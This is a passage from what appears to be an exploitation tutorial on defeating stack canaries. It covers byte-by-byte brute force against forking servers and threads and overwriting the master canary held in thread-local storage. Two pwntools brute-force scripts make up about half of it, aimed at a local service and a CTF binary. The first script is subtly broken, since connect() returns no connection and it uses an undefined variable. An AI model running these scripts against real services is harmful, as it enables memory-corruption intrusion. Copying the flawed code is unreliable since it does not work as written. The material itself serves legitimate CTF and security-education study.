  \ a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to bypass them.**\n\
  \n![](<../../../images/image (865).png>)\n\n> [!TIP]\n> Note that **`checksec`** might not find that a binary is protected\
  \ by a canary if this was statically compiled and it's not capable to identify the function.\\\n> However, you can manually\
  \ notice this if you find that a value is saved in the stack at the beginning of a function call and this value is checked\
  \ before exiting.\n\n## Brute force Canary\n\nThe best way to bypass a simple canary is if the binary is a program **forking\
  \ child processes every time you establish a new connection** with it (network service), because every time you connect\
  \ to it **the same canary will be used**.\n\nThen, the best way to bypass the canary is just to **brute-force it char by\
  \ char**, and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues\
  \ its regular flow. In this example the function **brute-forces an 8 Bytes canary (x64)** and distinguish between a correct\
  \ guessed byte and a bad byte just **checking** if a **response** is sent back by the server (another way in **other situation**\
  \ could be using a **try/except**):\n\n### Example 1\n\nThis example is implemented for 64bits but could be easily implemented\
  \ for 32 bits.\n\n```python\nfrom pwn import *\n\ndef connect():\n    r = remote(\"localhost\", 8788)\n\ndef get_bf(base):\n\
  \    canary = \"\"\n    guess = 0x0\n    base += canary\n\n    while len(canary) < 8:\n        while guess != 0xff:\n  \
  \          r = connect()\n\n            r.recvuntil(\"Username: \")\n            r.send(base + chr(guess))\n\n         \
  \   if \"SOME OUTPUT\" in r.clean():\n                print \"Guessed correct byte:\", format(guess, '02x')\n          \
  \      canary += chr(guess)\n                base += chr(guess)\n                guess = 0x0\n                r.close()\n\
  \                break\n            else:\n                guess += 1\n                r.close()\n\n    print \"FOUND:\\\
  \\x\" + '\\\\x'.join(\"{:02x}\".format(ord(c)) for c in canary)\n    return base\n\ncanary_offset = 1176\nbase = \"A\" *\
  \ canary_offset\nprint(\"Brute-Forcing canary\")\nbase_canary = get_bf(base) #Get yunk data + canary\nCANARY = u64(base_can[len(base_canary)-8:])\
  \ #Get the canary\n```\n\n### Example 2\n\nThis is implemented for 32 bits, but this could be easily changed to 64bits.\\\
  \nAlso note that for this example the **program expected first a byte to indicate the size of the input** and the payload.\n\
  \n```python\nfrom pwn import *\n\n# Here is the function to brute force the canary\ndef breakCanary():\n\tknown_canary =\
  \ b\"\"\n\ttest_canary = 0x0\n\tlen_bytes_to_read = 0x21\n\n\tfor j in range(0, 4):\n\t\t# Iterate up to 0xff times to brute\
  \ force all posible values for byte\n\t\tfor test_canary in range(0xff):\n\t\t\tprint(f\"\\rTrying canary: {known_canary}\
  \ {test_canary.to_bytes(1, 'little')}\", end=\"\")\n\n\t\t\t# Send the current input size\n\t\t\ttarget.send(len_bytes_to_read.to_bytes(1,\
  \ \"little\"))\n\n\t\t\t# Send this iterations canary\n\t\t\ttarget.send(b\"0\"*0x20 + known_canary + test_canary.to_bytes(1,\
  \ \"little\"))\n\n\t\t\t# Scan in the output, determine if we have a correct value\n\t\t\toutput = target.recvuntil(b\"\
  exit.\")\n\t\t\tif b\"YUM\" in output:\n\t\t\t\t# If we have a correct value, record the canary value, reset the canary\
  \ value, and move on\n\t\t\t\tprint(\" - next byte is: \" + hex(test_canary))\n\t\t\t\tknown_canary = known_canary + test_canary.to_bytes(1,\
  \ \"little\")\n\t\t\t\tlen_bytes_to_read += 1\n\t\t\t\tbreak\n\n\t# Return the canary\n\treturn known_canary\n\n# Start\
  \ the target process\ntarget = process('./feedme')\n#gdb.attach(target)\n\n# Brute force the canary\ncanary = breakCanary()\n\
  log.info(f\"The canary is: {canary}\")\n```\n\n## Threads\n\nThreads of the same process will also **share the same canary\
  \ token**, therefore it'll be possible to **brute-forc**e a canary if the binary spawns a new thread every time an attack\
  \ happens.\n\nMoreover, a buffer **overflow in a threaded function** protected with canary could be used to **modify the\
  \ master canary stored in the TLS**. This is because, it might be possible to reach the memory position where the TLS is\
  \ stored (and therefore, the canary) via a **bof in the stack** of a thread.\\\nAs a result, the mitigation is useless because\
  \ the check is used with two canaries that are the same (although modified).\\\nThis attack is performed in the writeup:\
  \ [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)\n\
  \nCheck also the presentation of [https://www.slideshare.net/codeblue_jp/master-canary-forging-by-yuki-koike-code-blue-2015](https://www.slideshare.net/codeblue_jp/master-canary-forging-by-yuki-koike-code-blue-2015)\
  \ which mentions that usually the **TLS** is stored by **`mmap`** and when a **stack** of **thread** is created it's also\
  \ generated by `mmap` according to this, which might allow the overflow as shown in the previous writeup.\n\n## Other examples\
